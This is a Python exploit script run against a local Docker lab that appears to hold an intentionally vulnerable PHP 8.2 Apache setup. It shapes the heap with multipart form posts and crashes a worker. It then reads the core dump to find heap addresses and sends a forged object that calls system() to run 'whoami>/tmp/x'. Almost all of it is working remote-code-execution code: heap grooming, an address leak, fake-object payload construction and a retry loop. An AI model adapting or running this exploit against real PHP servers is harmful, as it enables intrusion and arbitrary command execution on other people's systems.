#!/usr/bin/env python3
"""oom124: SIGNATURE-ANCHORED ARM — measure the block's true address from the
crash core, then arm B to it in the same boot.

Facts driving this (core.123d + dump):
- walked arData = mostly REAL buckets; crash bucket = first stale (counted-
  but-unwritten) tail slot; tail content = recycled freed-heap pages (K).
- K seed class = ~3056B name chunks (KEYLEN-8). 3KB VALUES are the same
  malloc size class -> freed 3KB warm-post values can seed the tail.
- apache prefork: children fork the master -> heap addresses identical for
  every request in a boot -> measured addresses hold across same-boot posts
  when the post-byte-lengths match (glibc layout is content-independent).
- fork-inherited arena stability observed: 'arena address unchanged on retry'.

Fire 1 (measure): warm shape (payload68 K1S) + 3 sig-seed posts (3KB values,
SIG8 tile) + armed-shaped post (4200 parts, values SIG8 tile, part13 = SIG8).
Crash -> core -> python ELF scan -> SIG8 clusters: part13 cluster (4200-part
post) + seed clusters -> true heap geometry.

Fire 2 (kill): same boot, same byte-lengths; warm posts now tile 3KB values
with B||B (freed at warm shutdown -> tail seeded B||B -> walk rdi=B);
part13 carries the dispatch block at OFF_B (B legal: lo nibble 8, bit8=1,
bit9=0) -> rc 1->0 -> rc_dtor -> store_del -> free_obj=system -> /tmp/x.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
SKIP16 = b"\x02" * 16
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
NV = 192                      # 3072B values
V3K = SIG8 * 384              # 3072B sig-tiled value
K1 = 4200
PART = 13
KEYFILL = b"K" * 3056         # payload68 name-filler class (proven seed)
CORE = "/tmp/core.124"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def name_head(i):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + KEYFILL +
            b"%d" % i + b'[x]"\r\n\r\n')

def build_body(part13_val, val3k):
    """4200 K-name parts; values = val3k except part13."""
    ps = []
    for i in range(K1):
        ps.append(name_head(i) + (part13_val if i == PART else val3k) + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def warm_post(k1, val3k):
    """Warm/shaping post: k1 K-name parts + PREP poison, 3KB values."""
    ps = [name_head(i) + val3k + b"\r\n" for i in range(k1)]
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire_and_core(tag, timeout=300):
    """Wait for crash signals; pull core into phpbuild. Returns segv delta."""
    n0 = segv_count()
    c, r = post_mod(CURRENT[0])
    time.sleep(2)
    d = segv_count() - n0
    core = sh("test -f /tmp/core && echo y") == "y"
    print("%s: http=%s segv+%d core=%s" % (tag, c, d, core), flush=True)
    if core:
        subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
        subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + CORE + tag], capture_output=True)
        sh("mv /tmp/core /tmp/core.used 2>/dev/null")
    return d, core, r

def core_scan(sig, tag):
    """Scan core PT_LOAD segments in python for sig; return cluster starts."""
    subprocess.run(["docker", "cp", "phpbuild:" + CORE + tag, "/tmp/scan_core"], capture_output=True)
    import mmap
    f = open("/tmp/scan_core", "rb")
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    # ELF64 program headers
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    segs = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, p_flags = struct.unpack_from("<II", mm, off)
        p_offset, p_vaddr, _pa, p_filesz = struct.unpack_from("<QQQQ", mm, off + 8)
        if p_type == 1 and p_filesz > 0x10000:   # PT_LOAD, sizable
            segs.append((p_vaddr, p_offset, p_filesz))
    hits = []
    for vaddr, off, filesz in segs:
        data = mm[off:off + filesz]
        start = 0
        while True:
            j = data.find(sig, start)
            if j < 0:
                break
            hits.append(vaddr + j)
            start = j + 1
    mm.close(); f.close()
    hits.sort()
    # cluster: hits within 64KB of previous belong to one chunk-region
    clusters = []
    for h in hits:
        if clusters and h - clusters[-1][-1] < 65536:
            clusters[-1].append(h)
        else:
            clusters.append([h])
    return [(c[0], c[-1], len(c)) for c in clusters]

CURRENT = [None]

print("=== oom124: signature-anchored arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

# ---- shape: payload68 warm sequence (proven H-shape + K churn) ----
for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# ---- FIRE 1: measure part13 true address ----
sigpost = build_body(V3K, V3K)                 # all 4200 values SIG8-tiled
CURRENT[0] = sigpost
d, core, r = fire_and_core("fire1")
assert core, "fire1 produced no core"
clusters = core_scan(SIG8, "f1")
print("fire1 sig clusters (start,end,n):", [(hex(a), hex(b), n) for a, b, n in clusters][:12], flush=True)
big = [c for c in clusters if c[2] >= 64]      # 3072B tile -> ~192+ hits/chunk
assert big, "no sig clusters"
A13 = big[-1][0]                               # last big cluster = armed post's part13 (parsed last-ish)
print("A13(candidate part13 chunk start)=0x%x hits=%d" % (A13, big[-1][2]), flush=True)

# ---- legality slide: B = A13 + OFF, block at OFF ----
B = OFF = None
for delta in range(8, 3072 - 0xB8, 16):
    cand = A13 + delta
    if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
        nb = cand.to_bytes(6, "little")
        if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
            B, OFF = cand, delta
            break
assert B, "no legal B near A13"
print("B=0x%x OFF=0x%x nib=%x bit8=%d bit9=%d" % (B, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)

# ---- FIRE 2: armed, same boot, same byte-lengths ----
def part13_block():
    t = bytearray(SIG8 * 384)
    st = struct.pack_into
    st("<II", t, OFF + 0x00, 1, 0x108)
    st("<II", t, OFF + 0x08, 1, 0)
    st("<Q", t, OFF + 0x10, 0)
    st("<Q", t, OFF + 0x18, B + 0x68)
    st("<I", t, OFF + 0x2C, 1)
    st("<Q", t, OFF + 0x50, B + 0x90)
    t[OFF + 0x58] = 6
    st("<I", t, OFF + 0x5C, 0x106)
    st("<Q", t, OFF + 0x68, 0)
    st("<Q", t, OFF + 0x70, BASE + ZIF)
    st("<IIQI", t, OFF + 0x90, 1, 0x106, 0, len(CMD))
    t[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    for s in range(0, len(t), 16):
        if not (OFF <= s < OFF + 0xB8):
            t[s:s + 16] = cell_of(B)
    return bytes(t)

BCELL = cell_of(B)
seedval = BCELL * 192                          # 3072B B||B tile (seed pool)
armed = build_body(part13_block(), seedval)
assert len(armed) == len(sigpost), "length drift %d vs %d" % (len(armed), len(sigpost))
CURRENT[0] = armed
xf0 = sh("cat /tmp/x 2>&1")
d, core, r = fire_and_core("fire2")
xf = sh("cat /tmp/x 2>&1")
print("fire2 /tmp/x: %r" % xf[:60], flush=True)
if core:
    cl = core_scan(cell_of(B), "f2")
    print("fire2 B-cell clusters:", [(hex(a), hex(b), n) for a, b, n in cl][:8], flush=True)

# ---- fire2b: re-shape + one more shot if first arm failed ----
if "/tmp/x" not in xf:
    print("--- re-shape + fire2b ---", flush=True)
    for k1 in P.K1S[-4:-1]:
        post_mod(P.build_attack(k1, 5000000))
    for _ in range(3):
        post_mod(warm_post(60, seedval))       # seed pool with B||B pages
    print("reshaped segv=%d base=0x%x" % (segv_count(), base_now() or 0), flush=True)
    CURRENT[0] = armed
    d, core, r = fire_and_core("fire2b")
    xf = sh("cat /tmp/x 2>&1")
    print("fire2b /tmp/x: %r" % xf[:60], flush=True)

print("=== done ===", flush=True)
